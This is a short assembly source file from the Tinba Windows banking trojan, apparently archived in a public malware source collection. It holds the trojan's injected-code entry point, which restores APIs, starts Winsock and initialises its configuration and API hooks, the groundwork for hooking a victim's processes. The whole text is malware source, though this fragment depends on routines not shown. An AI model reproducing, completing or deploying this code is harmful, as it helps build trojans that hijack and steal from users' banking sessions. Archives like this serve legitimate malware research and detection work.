; ------------------------------------------------------------
; name      Tinba
; type      trojan
; cve       —
; year      unknown
; os        Windows
; authors   unknown
; source    RamadhanAmizudin/malware
; archived  RamadhanAmizudin, krisyotam (2026)
; notes     —
; ------------------------------------------------------------

.code

;; ==================================================================================================== ;;
;; INJECTED_START - injected code entry point                                                           ;;
;; ==================================================================================================== ;;
INJECTED_START proc
	local  WSAData  : WSADATA


	GetBaseDelta ebx

	invokx  &RestoreAPIs[ebx]

	invokx  _WSAStartup[ebx], 202h, &WSAData

	invokx  &InitCfg[ebx]
	invokx  &InitArr[ebx]
	invokx  &InitHooks[ebx]

	ret
INJECTED_START endp

